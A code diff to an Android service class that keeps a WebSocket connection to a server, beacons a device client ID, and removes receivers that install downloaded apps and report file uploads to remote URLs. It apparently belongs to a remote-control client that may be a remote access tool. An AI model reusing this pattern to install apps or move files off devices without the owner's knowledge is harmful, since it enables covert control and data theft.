@@ -48,7 +48,8 @@ public class MainService extends Service {
         if (!isConnected) {
             try {
                 connectToWebSocket();
-            } catch (URISyntaxException e) {}
+            } catch (URISyntaxException e) {
+            }
         }
 
         final Handler handler = new Handler();
@@ -59,7 +60,8 @@ public class MainService extends Service {
             public void run() {
                 try {
                     updateWebSocketID();
-                } catch (JSONException e) {}
+                } catch (JSONException e) {
+                }
                 handler.postDelayed(this, delay);
             }
         }, delay);
@@ -89,65 +91,6 @@ public class MainService extends Service {
             json.put("type", "client");
             json.put("res", "id");
             client.send(json.toString());
-        }
-    }
-
-    /**
-     * Download completed receiver
-     */
-    public static class DownloadComplete extends BroadcastReceiver {
-
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            if ("android.intent.action.DOWNLOAD_COMPLETE".equals(intent.getAction())) {
-                String app = intent.getStringExtra("app_path");
-                if (!app.isEmpty() && app != null)
-                    PackageManager.installApp(context, app);
-
-                String downloadURL = intent.getStringExtra("download_url");
-
-                if (client != null && client.isOpen()) {
-                    String message = Utils.clientID(context) + ": " + downloadURL + " successfully downloaded";
-                    JSONObject json = new JSONObject();
-                    try {
-                        json.put("type", "client");
-                        json.put("id", Utils.clientID(context));
-                        json.put("res", "log");
-                        json.put("message", Base64.encode(message.getBytes(), Base64.DEFAULT));
-                        json.put("timestamp", System.currentTimeMillis());
-
-                        client.send(json.toString());
-                    } catch (JSONException e) {}
-                }
-            }
-        }
-    }
-
-    /**
-     * Completed file upload receiver
-     */
-    public static class UploadComplete extends BroadcastReceiver {
-
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            if ("upload_complete".equals(intent.getAction())) {
-                String filePath = intent.getStringExtra("file_path");
-                String uploadURL = intent.getStringExtra("upload_url");
-
-                if (client != null && client.isOpen()) {
-                    String message = Utils.clientID(context) + ": " + filePath + " successfully uploaded to " + uploadURL;
-                    JSONObject json = new JSONObject();
-                    try {
-                        json.put("type", "client");
-                        json.put("id", Utils.clientID(context));
-                        json.put("res", "log");
-                        json.put("message", Base64.encode(message.getBytes(), Base64.DEFAULT));
-                        json.put("timestamp", System.currentTimeMillis());
-
-                        client.send(json.toString());
-                    } catch (JSONException e) {}
-                }
-            }
         }
     }
 }
